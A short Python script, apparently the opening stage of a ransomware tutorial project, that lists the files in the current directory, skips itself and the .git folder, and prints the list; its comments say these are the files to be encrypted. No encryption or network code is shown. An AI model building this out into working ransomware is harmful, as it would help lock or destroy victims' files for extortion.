#! /usr/bin/env python3

import os

# find the files

files = []

# go through every file we can find in our current working directory
# we do not want to encrypt the ransomware file though!
# we also don't want to add directories
for file in os.listdir():
    if file == "ransomware.py":
        continue
    if file == ".git":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)
